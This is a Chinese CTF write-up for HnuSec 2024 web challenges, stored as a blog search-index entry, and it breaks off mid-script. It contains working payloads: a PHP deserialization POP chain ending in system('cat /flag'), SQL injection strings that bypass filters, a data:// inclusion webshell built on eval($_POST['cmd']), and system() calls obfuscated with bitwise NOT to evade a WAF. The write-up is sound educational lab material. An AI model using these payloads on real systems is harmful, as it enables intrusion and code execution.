<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>HnuSec 2024 CTF</title>
    <link href="/2024/08/17/HnuSec%202024%20CTF/"/>
    <url>/2024/08/17/HnuSec%202024%20CTF/</url>
    
    <content type="html"><![CDATA[<p><a name="Xdi9k"></a></p><h1 id="战况"><a href="#战况" class="headerlink" title="战况"></a>战况</h1><p>两个二血一个一血，有一题题目出问题了导致没能拿下<br>出题人说算我ak了好吧<br>![](HnuSec 2024 CTF&#x2F;1.png)<br><a name="OYT9Y"></a></p><h1 id="What-Do-You-Want"><a href="#What-Do-You-Want" class="headerlink" title="What Do You Want!"></a>What Do You Want!</h1><p>![](HnuSec 2024 CTF&#x2F;2.png)<br>看样子应该是<code>robotx.txt</code>协议了<br>![](HnuSec 2024 CTF&#x2F;3.png)<br>那么访问<code>/The_Deep_Ends</code>看看<br>![](HnuSec 2024 CTF&#x2F;4.png)<br>那么就是XFF了，可惜不行，用bp爆破出来是X-Client-IP: 127.0.0.1<br>然后就是一系列的http的东西了就直接放payload了，这里的Via也是挺折磨我的，以前没见过然后找了好久而且悟空官网路径忘记加www一直错，给我整的快吐血了<br>![](HnuSec 2024 CTF&#x2F;5.png)<br>访问<code>/The_Golden_Light</code><br>![](HnuSec 2024 CTF&#x2F;6.png)<br>那么就是简单的<code>cookie</code>传参了<br>![](HnuSec 2024 CTF&#x2F;7.png)<br><a name="ldBOR"></a></p><h1 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h1><p>进来提示，感觉是cookie验证<br>![](HnuSec 2024 CTF&#x2F;8.png)<br>打开hacker一看果然是，吧cookie里面的值改成admin就过去了<br>![](HnuSec 2024 CTF&#x2F;9.png)<br><strong>访问&#x2F;hhhheelllloooo.php就是源码了</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WOWO</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$nano</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hahaha</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$evn</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;evn-&gt;<span class="hljs-keyword">do</span>=<span class="hljs-string">&#x27;do you know serialize?&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;hahaha;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Soga</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$asdj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$grape</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;asdj-&gt;nano;<br>    &#125;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;grape=<span class="hljs-string">&#x27;123&#x27;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;are you sure?&#x27;</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">H</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span> ;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span> ;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$Love</span>=<span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-variable">$Love</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable language_">$this</span>-&gt;b);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;it&#x27;s too esay,yet?&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NANI</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lal</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$so</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$star</span>,<span class="hljs-variable">$bob</span></span>)</span>&#123;<br>        <span class="hljs-variable">$str</span>=<span class="hljs-variable language_">$this</span>-&gt;lal;<br>        <span class="hljs-variable">$str</span>();<br><br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Dman</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$apple</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$strawberry</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;apple;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>        <span class="hljs-variable">$des</span>=<span class="hljs-variable language_">$this</span>-&gt;strawberry;<br>        <span class="hljs-variable">$des</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hnu</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sun</span>=<span class="hljs-string">&#x27;HnuSec is very good&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$setad</span>=<span class="hljs-string">&#x27;do you think so?&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;setad=<span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Thank you,have a fun.&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Hnu&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Hnu&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$cmd</span>));<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>开始构造pop链，下面是我构造的，注意是反过来的<br><code>H_tostring-&gt;WOWO_get-&gt;Soga_invoke-&gt;NANI_set-&gt;WOWO_destruct</code><br>其他的魔术方法下面没有可控参数大于2的，于是就只剩H类下面的toString了<br>那么看看我的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//H_tostring-&gt;WOWO_get-&gt;Soga_invoke-&gt;NANI_set-&gt;WOWO_destruct</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WOWO</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$nano</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hahaha</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$evn</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Soga</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$asdj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$grape</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">H</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;create_function&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;&#125;system(&#x27;cat /flag&#x27;);//&quot;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NANI</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lal</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$so</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">WOWO</span>();<br><span class="hljs-variable">$a</span>-&gt;evn = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">NANI</span>();<br><span class="hljs-variable">$a</span>-&gt;evn-&gt;lal = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Soga</span>();<br><span class="hljs-variable">$a</span>-&gt;evn-&gt;lal-&gt;asdj = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">WOWO</span>();<br><span class="hljs-variable">$a</span>-&gt;evn-&gt;lal-&gt;asdj-&gt;hahaha = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">H</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>成功拿到flag</strong><br>![](HnuSec 2024 CTF&#x2F;10.png)<br><a name="yJRCM"></a></p><h1 id="谢谢皮蛋🥚"><a href="#谢谢皮蛋🥚" class="headerlink" title="谢谢皮蛋🥚"></a>谢谢皮蛋🥚</h1><p>我进来就是传一个1,然后报错提示，看来是数字注入<br>![](HnuSec 2024 CTF&#x2F;11.png)<br>然后就开始走流程<br>输入<code>1 group by 2#</code>爆列数&#x2F;&#x2F;两列<br>输入<code>1 union select 1,2#</code>报错如下<br>![](HnuSec 2024 CTF&#x2F;12.png)<br>猜测是union被替换了于是<br>输入<code>-11 ununionion select 1,2#</code>爆回显位置<br>输入<code>-11 ununionion select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</code>爆表名，发现&#x3D;被过滤了，绕过一下<br>输入<code>-11 ununionion select 1,group_concat(table_name) from information_schema.tables where table_schema like database()#</code><br>![](HnuSec 2024 CTF&#x2F;13.png)<br>输入<code>-11 ununionion select 1,group_concat(column_name) from information_schema.columns where table_schema like database()#</code>爆列名字<br>![](HnuSec 2024 CTF&#x2F;14.png)<br>看组合就是每个表三列了<br>输入<code>-11 ununionion select 1,group_concat(des,&#39;~&#39;,value) from F149#</code><br>![](HnuSec 2024 CTF&#x2F;15.png)<br><a name="RaxKw"></a></p><h1 id="海北大学后台管理系统Plus"><a href="#海北大学后台管理系统Plus" class="headerlink" title="海北大学后台管理系统Plus"></a>海北大学后台管理系统Plus</h1><p>看一下源码发现用户名<br>![](HnuSec 2024 CTF&#x2F;16.png)<br><strong>用题目给的字典爆破就好了，显而易见的密码</strong><br>![](HnuSec 2024 CTF&#x2F;17.png)<br><strong>进来了就随便输入点东西</strong><br>![](HnuSec 2024 CTF&#x2F;18.png)<br>![](HnuSec 2024 CTF&#x2F;19.png)<br>这密码就藏在源码里，放到hacker里base64解码一下，然后输入<br>![](HnuSec 2024 CTF&#x2F;20.png)<br>拿到地址&#x2F;Ewoji&#x2F;final0012llsnn.php，访问发现是文件包含的题目，源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/&lt;|\?|php|&gt;|echo|filter|system|file|%|&amp;|=|`|eval/i&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;dangerous function detect!&quot;</span>);<br>    &#125;;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;phpinfo&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">phpinfo</span>();<br>&#125;<br><span class="hljs-title function_ invoke__">waf</span>();<br><span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>ban掉了filter，并且参数是data，猜测用</p><p><strong>data:&#x2F;&#x2F;</strong><br>数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。</p><p>然后ban了好多东西，想执行命令只能用base64编码的形式了<br>传入<code>?data=data://text/plain;base64,&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;cmd&#39;]);  &lt;/script&gt;</code><br>（这里后面没编码是为了大家看清楚，实际使用需要base64编码，下同）<br><img src="https://cdn.nlark.com/yuque/0/2024/png/42549390/1723802141416-b083ec65-0041-42d7-9700-746aa3f77e40.png#averageHue=%231e1e27&clientId=u159ad21e-650b-4&from=paste&height=116&id=u77d22287&originHeight=174&originWidth=963&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=36808&status=done&style=none&taskId=u1e8dc135-ea30-4536-8285-2239ff42d94&title=&width=642" alt="image.png"><br>传进去后台会把一个’&gt;’吃了，猜测有waf<br>所以传入<code>?data=data://text/plain;base64,&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&gt;</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/42549390/1723801819400-47a26032-5075-4156-95ab-ad755241c895.png#averageHue=%23fcfbfb&clientId=u78575868-ba29-4&from=paste&height=645&id=ub2cfe0ef&originHeight=968&originWidth=1339&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=92076&status=done&style=none&taskId=u1e6f3d00-d2c5-4a36-8b63-e520cdf7063&title=&width=892.6666666666666" alt="image.png"><br>之后就是用cat读flag了<br><a name="D2aOM"></a></p><h1 id="海北大学后台管理系统"><a href="#海北大学后台管理系统" class="headerlink" title="海北大学后台管理系统"></a>海北大学后台管理系统</h1><p>进来就是和上面plus一样的界面，不过这次东西全在源码里![](HnuSec 2024 CTF&#x2F;21.png)<br>第二关也是看源码发现base64编码的密码<br>和puls一样的步骤不多解释<br>访问&#x2F;Ewoji&#x2F;final.php，展示源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//我是何晨光，我不想在战场上敌人捡到我的后门就可以直接使用，所以我决定加点限制</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num2&#x27;</span>]))&#123;<br><br>    <span class="hljs-variable">$num1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num1&#x27;</span>];<br>    <span class="hljs-variable">$num2</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num2&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$num1</span>!=<span class="hljs-variable">$num2</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$num1</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$num2</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;继续吧&quot;</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|\*|\_|tac|less|more|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$cmd</span>))&#123;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);<br>            &#125;<br><br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nonono&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>md5直接选择数组绕过</strong><br>![](HnuSec 2024 CTF&#x2F;22.png)<br>看了一下发现没过滤’~’，直接选择取反绕过，脚本如下（使用前记得更改）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;assert&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span><span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;(eval($_POST[cmd]))&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>?cmd=(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);</code><br>实际就是<code>system(&quot;ls /&quot;);</code><br>![](HnuSec 2024 CTF&#x2F;23.png)<br>输入<code>?cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%99%99%99%93%9E%98);</code><br>实际就是<code>system(&quot;cat /fffflag&quot;);</code><br>拿到一长串</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">继续吧恭喜你找到flag！我负责任的告诉你,secret:后面的字符是你需要的东西，但EWOJI五个大写字符不是你需要的东西EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:flWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWsecret:ag&#123;OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOsecret:salJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:lasjIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:lsdEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:13-WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWsecret:mOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOsecret:ccJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:abIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:obEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:2WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWsecret:4OOOOOOOOOOOOOOOOOOOOOOOOOsecret:zzJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:mkIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:bxEEEEEEEEEEEEEEEEEEEEEEEsecret:2-WWWWWWWWWWWWWWWsecret:zxOOOOOOOOOOOOOOOOOOOOOOOOOOOOOsecret:dsJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:gohIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:dsxEEEEEEEEEEEEEEEEEEEEEsecret:zxcWWWWWWWWWWWWsecret:zxwOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOosecret:0-JJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:ddxIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:zxwEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:12sWWWWWWWWWWWWWWWWsecret:dsxOOOOOOOOOOOOOOOOOOOOsecret:asxJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:zIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:zkEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:f-WWWWWWWWWWWWWWWWWWWWWWsecret:awOOOOOOOOOOOOsecret:xfJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:axdIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:amdEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:p2-WWWWWWWWWWWWWWsecret:xxOOOOOOOOOOOOOOOOOOOOOOOOsecret:zJJJJJJJJJJJJJJJJJJJJsecret:moIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:yhEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:aaWWWWWWWWWWWWsecret:tOOOOOOOOOOOOOOOOsecret:23JJJJJJJJJJJJJJJJJsecret:qw-IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:asdEEEEEEEEEEEEEEEEEEEEsecret:ghWWWWWWWWWWWWWWWWsecret:zxcOOOOOOOOOOOOOOOOOOOOOOOOOOOOOsecret:22JJJJJJJJJJJJJJJJJJJJJJsecret:czxcIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:owmEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:231WWWWWWWWWWWWWsecret:bye!&#125; <br></code></pre></td></tr></table></figure><p>编写脚本把里面多余的删除，脚本如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$string</span> = <span 